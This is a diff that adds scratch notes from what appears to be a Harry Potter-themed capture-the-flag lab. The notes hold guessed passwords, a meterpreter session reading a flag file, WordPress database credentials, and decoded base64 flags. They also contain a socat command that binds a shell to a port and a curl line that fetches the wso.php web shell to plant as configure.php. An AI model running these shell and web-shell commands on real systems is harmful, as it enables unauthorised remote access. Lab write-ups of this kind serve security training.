@@ -1,0 +1,42 @@
+ ginny
+
+ hagrid98
+
+ meterpreter > cat horcrux1.txt
+horcrux_{MTogUmlkRGxFJ3MgRGlBcnkgZEVzdHJvWWVkIEJ5IGhhUnJ5IGluIGNoYU1iRXIgb2YgU2VDcmV0cw==}
+
+
+define('DB_NAME', 'wordpress');
+define('DB_USER', 'root');
+define('DB_PASSWORD', 'mySecr3tPass');
+define('DB_HOST', 'localhost');
+define('DB_COLLATE', 'utf8_general_ci');
+define('WP_CONTENT_DIR', '/usr/share/wordpress/wp-content
+
+
+LPORT=12345
+socat TCP-LISTEN:$LPORT,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane
+
+Enter your spell: Lumos
+Magic Output: Entire surrounding is illuminated
+Enter your spell: Wingardium Leviosa
+Magic Output: You have successfully leviate the object
+Enter your spell: Alohomora
+Magic Output: All the doors are unlocked
+Enter your spell: Avada Kedavra
+Magic Output: This spell is black magic and is forbidden in hogwarts
+Enter your spell: Expelliarmus
+Magic Output: Your opponent is disarmed
+
+echo -n "MTogUmlkRGxFJ3MgRGlBcnkgZEVzdHJvWWVkIEJ5IGhhUnJ5IGluIGNoYU1iRXIgb2YgU2VDcmV0cw==" | base64 -d
+1: RidDlE's DiAry dEstroYed By haRry in chaMbEr of SeCrets
+echo -n "MjogbWFSdm9MbyBHYVVudCdzIHJpTmcgZGVTdHJPeWVkIGJZIERVbWJsZWRPcmU=" | base64 -d
+2: maRvoLo GaUnt's riNg deStrOyed bY DUmbledOre
+echo -n "MzogU2x5dGhFcmlOJ3MgTG9jS0VldCBkRXN0cm9ZZUQgYlkgUm9O" | base64 -d
+3: SlythEriN's LocKEet dEstroYeD bY RoN
+echo -n "NDogSGVsZ2EgSHVmZmxlcHVmZidzIEN1cCBkZXN0cm95ZWQgYnkgSGVybWlvbmU=" | base64 -d
+4: Helga Hufflepuff's Cup destroyed by Hermione
+echo -n "NTogRGlhZGVtIG9mIFJhdmVuY2xhdyBkZXN0cm95ZWQgYnkgSGFycnk=" | base64 -d
+5: Diadem of Ravenclaw destroyed by Harry
+
+curl http://192.168.11.181:8888/wso.php -o configure.php
